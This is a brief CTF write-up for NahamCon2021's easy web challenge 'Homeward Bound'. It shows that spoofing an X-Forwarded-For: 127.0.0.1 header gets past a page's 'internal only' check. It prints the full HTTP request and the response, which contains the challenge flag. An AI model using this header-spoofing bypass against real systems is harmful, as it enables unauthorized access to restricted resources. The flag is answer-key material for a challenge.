---
title: "NahamCon2021 CTF - Homeward Bound"
date: 2021-03-15T10:04:11+02:00
categories:
- writeup
- ctf
- nahamcon
- nahamcon2021
- 2021
---

## category

web - easy

## solution

The challenge URL returns the message `Sorry, this page is not accessible externally.`

{{< figure src="/images/nahamcon/homeward_bound.png" >}}

Add the `X-Forwarded-For: 127.0.0.1` header to reveal the flag.

```text
GET / HTTP/1.1
Host: challenge.nahamcon.com:30903
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
X-Forwarded-For: 127.0.0.1
Cookie: auth2=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E; auth=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E
Upgrade-Insecure-Requests: 1
```

The response has the flag.

```html
<p class="card-text">
    <div class="alert alert-success" role="alert">
        <b>Welcome!</b>
        Your internal access key is:
        <code>flag{26080a2216e95746ec3e932002b9baa4}</code>
    </div>
</p>
```
